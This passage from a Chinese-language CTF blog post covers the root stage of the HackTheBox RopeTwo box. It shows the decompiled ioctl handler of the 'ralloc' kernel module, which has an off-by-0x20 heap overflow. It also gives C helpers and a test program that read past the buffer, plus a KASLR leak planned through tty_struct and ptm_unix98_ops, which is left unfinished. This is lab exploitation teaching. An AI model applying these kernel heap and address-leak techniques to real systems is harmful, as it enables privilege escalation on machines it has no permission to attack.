(((uint)user_input &lt; 0x20) &amp;&amp; (*(long *)(arr + (ulong)(uint)user_input * 0x10 + 8) != 0)) &#123;</span><br><span class="line">        kfree();</span><br><span class="line">        *(undefined8 *)(arr + (ulong)(uint)user_input * 0x10 + 8) = 0;</span><br><span class="line">        <span class="built_in">return</span> = 0;</span><br><span class="line">        goto LAB_00100104;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (ioctl_num == 0x1002) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((uint)user_input &lt; 0x20) &#123;</span><br><span class="line">          <span class="keyword">if</span> ((*(void **)(arr + (ulong)(uint)user_input * 0x10 + 8) != (void *)0x0) &amp;&amp;</span><br><span class="line">             (__dest = *(void **)(arr + (ulong)(uint)user_input * 0x10 + 8), __src = user_input.data</span><br><span class="line">             , (user_input.size &amp; 0xffffffff) &lt; *(ulong *)(arr + (ulong)(uint)user_input * 0x10) ||</span><br><span class="line">               (user_input.size &amp; 0xffffffff) == *(ulong *)(arr + (ulong)(uint)user_input * 0x10)))</span><br><span class="line">          goto joined_r0x001001ec;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ioctl_num == 0x1003) &amp;&amp; ((uint)user_input &lt; 0x20)) &#123;</span><br><span class="line">          __src = *(void **)(arr + (ulong)(uint)user_input * 0x10 + 8);</span><br><span class="line">          <span class="keyword">if</span> ((__src != (void *)0x0) &amp;&amp;</span><br><span class="line">             (__dest = user_input.data,</span><br><span class="line">             (user_input.size &amp; 0xffffffff) &lt;= *(ulong *)(arr + (ulong)(uint)user_input * 0x10))) &#123;</span><br><span class="line">joined_r0x001001ec:</span><br><span class="line">            <span class="keyword">if</span> (((ulong)user_input.data &amp; 0xffff000000000000) == 0) &#123;</span><br><span class="line">              memcpy(__dest,__src,user_input.size &amp; 0xffffffff);</span><br><span class="line">              <span class="built_in">return</span> = 0;</span><br><span class="line">              goto LAB_00100104;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> = -1;</span><br><span class="line">LAB_00100104:</span><br><span class="line">  mutex_unlock(lock);</span><br><span class="line">  <span class="keyword">if</span> (canary == *(long *)(in_GS_OFFSET + 0x28)) &#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进一步优化后的代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">long rope2_ioctl(undefined8 fd,int ioctl_num,long input_struct)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long _canary;</span><br><span class="line">  void *__dest;</span><br><span class="line">  void *__src;</span><br><span class="line">  long addr;</span><br><span class="line">  long user_input_;</span><br><span class="line">  ulong id;</span><br><span class="line">  long <span class="built_in">return</span>;</span><br><span class="line">  long in_GS_OFFSET;</span><br><span class="line">  ralloc_in user_input;</span><br><span class="line">  </span><br><span class="line">  __fentry__();</span><br><span class="line">  _canary = *(long *)(in_GS_OFFSET + 0x28);</span><br><span class="line">  mutex_lock(lock);</span><br><span class="line">  _copy_from_user(&amp;user_input,user_input_,0x18);</span><br><span class="line">                    /* ADD */</span><br><span class="line">  <span class="keyword">if</span> (ioctl_num == 0x1000) &#123;</span><br><span class="line">    id = (ulong)(uint)user_input.id;</span><br><span class="line">    <span class="keyword">if</span> ((user_input.size &lt; 0x401) &amp;&amp; ((uint)user_input.id &lt; 0x20)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (buffers[id].address == 0) &#123;</span><br><span class="line">        addr = __kmalloc(user_input.size,0x6000c0);</span><br><span class="line">        buffers[id].address = addr;</span><br><span class="line">        <span class="keyword">if</span> (addr != 0) &#123;</span><br><span class="line">          buffers[id].size = user_input.size + 0x20;</span><br><span class="line">          <span class="built_in">return</span> = 0;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">                    /* Delete */</span><br><span class="line">    <span class="keyword">if</span> (ioctl_num == 0x1001) &#123;</span><br><span class="line">      <span class="keyword">if</span> (((uint)user_input.id &lt; 0x20) &amp;&amp; (buffers[(uint)user_input.id].address != 0)) &#123;</span><br><span class="line">        kfree();</span><br><span class="line">        buffers[(uint)user_input.id].address = 0;</span><br><span class="line">        <span class="built_in">return</span> = 0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">                    /* Write */</span><br><span class="line">      <span class="keyword">if</span> (ioctl_num == 0x1002) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((uint)user_input.id &lt; 0x20) &#123;</span><br><span class="line">          <span class="keyword">if</span> (((void *)buffers[(uint)user_input.id].address != (void *)0x0) &amp;&amp;</span><br><span class="line">             (__dest = (void *)buffers[(uint)user_input.id].address, __src = user_input.data,</span><br><span class="line">             (user_input.size &amp; 0xffffffff) &lt; buffers[(uint)user_input.id].size ||</span><br><span class="line">             (user_input.size &amp; 0xffffffff) == buffers[(uint)user_input.id].size))</span><br><span class="line">          goto joined_r0x001001ec;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">                    /* Read */</span><br><span class="line">        <span class="keyword">if</span> ((ioctl_num == 0x1003) &amp;&amp; ((uint)user_input.id &lt; 0x20)) &#123;</span><br><span class="line">          __src = (void *)buffers[(uint)user_input.id].address;</span><br><span class="line">          <span class="keyword">if</span> ((__src != (void *)0x0) &amp;&amp;</span><br><span class="line">             (__dest = user_input.data,</span><br><span class="line">             (user_input.size &amp; 0xffffffff) &lt;= buffers[(uint)user_input.id].size)) &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (((ulong)user_input.data &amp; 0xffff000000000000) == 0) &#123;</span><br><span class="line">        memcpy(__dest,__src,user_input.size &amp; 0xffffffff);</span><br><span class="line">        <span class="built_in">return</span> = 0;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">return</span> = -1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  mutex_unlock(lock);</span><br><span class="line">  <span class="keyword">if</span> (_canary == *(long *)(in_GS_OFFSET + 0x28)) &#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>基本上，在4个可能的输入代码上有一个switch语句来执行添加(0x1000)、删除(0x1001)、写入(0x1002)和读取(0x1003)。</p>
<p>漏洞在于如何添加新块。有一个检查来确保块不大于0x400，并且id小于32，然后将大小保存到比缓冲区大0x20字节的缓冲区列表中。这允许在缓冲区的末端之外进行读写操作。</p>
<h2 id="基本相互作用"><a href="#基本相互作用" class="headerlink" title="基本相互作用"></a>基本相互作用</h2><p>开始写一个c程序，将与设备交互，包括一些帮助函数，以进行每个IOCTL调用:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ioctl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line">int fd;</span><br><span class="line"></span><br><span class="line">struct user_data_struct &#123;</span><br><span class="line">    uint64_t id;</span><br><span class="line">    uint64_t size;</span><br><span class="line">    void* data;</span><br><span class="line">&#125; user_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long create_buf(uint64_t id, uint64_t size)&#123;</span><br><span class="line">    user_data.id = id;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1000, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">long delete_buf(uint64_t id) &#123;</span><br><span class="line">    user_data.id = id;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1001, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long write_buf(uint64_t id, uint64_t size, void *data)&#123;</span><br><span class="line">    user_data.id = id;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    user_data.data = data;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1002, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long read_buf(uint64_t id, uint64_t size, void *data)&#123;</span><br><span class="line">    user_data.id = id;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    user_data.data = data;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1003, &amp;user_data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，将从一个简单的main开始，它打开设备，清除缓冲区，创建一个缓冲区，向它写入0x40字节的As，然后从它读取0x420字节:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc) &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ralloc&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == -1) &#123;</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;Failed to open /dev/ralloc&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">        delete_buf(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    create_buf(1, 0x400);</span><br><span class="line"></span><br><span class="line">    uint64_t *input = malloc(0x400);</span><br><span class="line">    memset(input, 0x41, 0x40);</span><br><span class="line">    write_buf(1, 0x40, input);</span><br><span class="line"></span><br><span class="line">    uint64_t *output = malloc(0x420);</span><br><span class="line">    read_buf(1, 0x420, output);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0; i &lt; 0x420/8; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i % 4 == 0) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n%03x: &quot;</span>, i*8);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%016lx &quot;</span>, output[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当运行这个，得到的结果匹配所期望的:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ropetest:~$ ./exploit</span><br><span class="line"></span><br><span class="line">000: 4141414141414141 4141414141414141 4141414141414141 4141414141414141 &lt;-- 0x40 bytes of A</span><br><span class="line">020: 4141414141414141 4141414141414141 4141414141414141 4141414141414141 </span><br><span class="line">040: 6c732f6c656e7265 61686769732f6261 65686361635f646e 2f70756f7267632f &lt;-- random stuff <span class="keyword">in</span> 0x400 byte buffer</span><br><span class="line">060: 5f646e6168676973 3039286568636163 6f69737365733a35 732e343939312d6e </span><br><span class="line">080: 5553002965706f63 3d4d455453595342 530070756f726763 39383d4d554e5145 </span><br><span class="line">0a0: 5f43455355003632 494c414954494e49 313631313d44455a 3339353439323531 </span><br><span class="line">0c0: ffff9880f48c0000 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">0e0: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">100: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">120: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">140: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">160: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">180: dead000000000200 dead000000000100 dead000000000200 ffff9880f48c7598 </span><br><span class="line">1a0: ffff9880f48c7598 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">1c0: 0000000000000000 ffff9880f48c75c8 ffff9880f48c75c8 ffff9880f48c75d8 </span><br><span class="line">1e0: ffff9880f48c75d8 ffff9880f48c75e8 ffff9880f48c75e8 0000000000000000 </span><br><span class="line">200: 0000000000000000 0000000000000000 0000000000000000 ffff987fa5bf3800 </span><br><span class="line">220: 0000000000000218 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">240: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">260: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">280: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">2a0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">2c0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">2e0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">300: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">320: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">340: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">360: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">380: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">3a0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">3c0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">3e0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">400: ffffffff960c4f20 ffffffff9655c3c0 ffffffff96067120 ffffffff96711080 &lt;-- reading into next buffer</span><br></pre></td></tr></table></figure>

<h2 id="KASLR-Defeat"><a href="#KASLR-Defeat" class="headerlink" title="KASLR Defeat"></a>KASLR Defeat</h2><h3 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h3><p>利用内核堆的一种常用技术是找到tty_struct。可以稍后使用它来执行，但首先将使用它来泄漏一个地址，这个地址与内核基的常量偏移量相等。将使用/dev/ptmx创建它，这是一个<span class="exturl" data-url="aHR0cHM6Ly9saW51eC5kaWUubmV0L21hbi80L3B0bXg=">伪终端设备<i class="fa fa-external-link-alt"></i></span>。有很多文章展示了利用这一点的好例子，比如<span class="exturl" data-url="aHR0cHM6Ly9jaGFuZ29jaGVuLmdpdGh1Yi5pby8yMDE4LTAyLTA3LXNoYXJpZjguaHRtbA==">这个<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9oYWNrbWQuaW8vQHB0ci15dWRhaS9ySnAxVHBiQlU=">这个<i class="fa fa-external-link-alt"></i></span>。</p>
<p>其思想是，创建一个新的缓冲区，然后立即打开/dev/ptmx，它将为tty_struct分配一个0x2e0字节的内核缓冲区，希望紧接在缓冲区之后。因为可以读取0x20字节超出缓冲区的结束，希望将能够读取到结构，它有以下格式:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct tty_struct &#123;</span><br><span class="line">    int    magic;</span><br><span class="line">    struct kref kref;</span><br><span class="line">    struct device *dev;</span><br><span class="line">    struct tty_driver *driver;</span><br><span class="line">    const struct tty_operations *ops;</span><br><span class="line">    /* ...... */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目标是读取tty_operations指针，因为它指向ptm_unix98_ops，它与内核基的偏移量是恒定的。第一个尝试是使用TTY_MAGIC<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmh1aWhvby5jb20vZG94eWdlbi9saW51eC9rZXJuZWwvMy43L2luY2x1ZGVfMmxpbnV4XzJ0dHlfOGhfc291cmNlLmh0bWw=">定义为<i class="fa fa-external-link-alt"></i></span>0x5401这一事实来检查是否设法读取正确的结构体。但是，内存中有多个tty_struct，当查看调试器时，它会发现其他的tty_struct不指向ptm_unix98_ops。</p>
<p>可以在gdb中查看ptm_unix98_ops的当前地址:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p &amp;ptm_unix98_ops</span><br><span class="line"><span class="variable">$1</span> = (const struct tty_operations *) 0xffffffff820af6a0</span><br><span class="line">&lt;ptm_unix98_ops&gt;</span><br></pre></td></tr></table></figure>

<p>虽然顶部的地址会随着KASLR而改变，但底部的三颗不会改变。因此，将寻找magic和最后三个字节，期望tty_operations。</p>
<p>要找到从ptm_unix98_ops到内核基的偏移量，将查看/proc/kallsyms。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ropetest:~<span class="comment"># cat /proc/kallsyms | grep &#x27; startup_64&#x27;</span></span><br><span class="line">ffffffff94a00000 T startup_64</span><br></pre></td></tr></table></figure>

<p>所以偏移量是:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p 0xffffffff95aaf6a0 - 0xffffffff94a00000</span><br><span class="line"><span class="variable">$1</span> = 0x10af6a0</span><br></pre></td></tr></table></figure>

<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>未完持续</p>
<p><font color="red"><strong><em>Damn! Really a Journey to the Hell! Ha?</em></strong></font></p>

    </div>

    
    
    
        <div class="reward-container">
  <div></div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    Donate
  </button>
  <div id="qr" style="display: none;">
      
      <div style="display: inline-block;">
        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div style="display: inline-block;">
        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
        <p>Alipay</p>
      </div>

  </div>
</div>

        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:  </strong>lUc1f3r11
  </li>
  <li class="post-copyright-link">
    <strong>Post link: </strong>
    <a href="https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/" title="HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP]">https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

        

  <div class="followme">
    <p>Welcome to my other publishing channels</p>

    <div class="social-list">

        <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
        </div>

        <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
        </div>

        <div class="social-item">
          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </a>
        </div>
    </div>
  </div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"># pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/02/23/breadcrumbs/" rel="prev" title="Hack-The-Box-walkthrough[Breadcrumbs]">
      <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Breadcrumbs]
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">2.</span> <span class="nav-text">枚举</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E9%85%8D%E7%BD%AE"><span class="nav-number">3.</span> <span class="nav-text">本地配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BAVM"><span class="nav-number">3.1.</span> <span class="nav-text">搭建VM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85ralloc"><span class="nav-number">3.2.</span> <span class="nav-text">安装ralloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb"><span class="nav-number">3.3.</span> <span class="nav-text">gdb</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">静态分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E7%94%A8%E7%BB%93%E6%9E%84"><span class="nav-number">4.1.</span> <span class="nav-text">通用结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IOCTL"><span class="nav-number">4.2.</span> <span class="nav-text">IOCTL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E6%9E%84"><span class="nav-number">4.3.</span> <span class="nav-text">结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rope2-ioctl"><span class="nav-number">4.4.</span> <span class="nav-text">rope2_ioctl</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%9B%B8%E4%BA%92%E4%BD%9C%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">基本相互作用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#KASLR-Defeat"><span class="nav-number">6.</span> <span class="nav-text">KASLR Defeat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%96%E7%95%A5"><span class="nav-number">6.1.</span> <span class="nav-text">策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0"><span class="nav-number">6.2.</span> <span class="nav-text">实现</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
      src="/images/lucifer11.jpg">
  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
  <div class="site-description" itemprop="description">all things about infosec & ctf</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">135</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">29</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
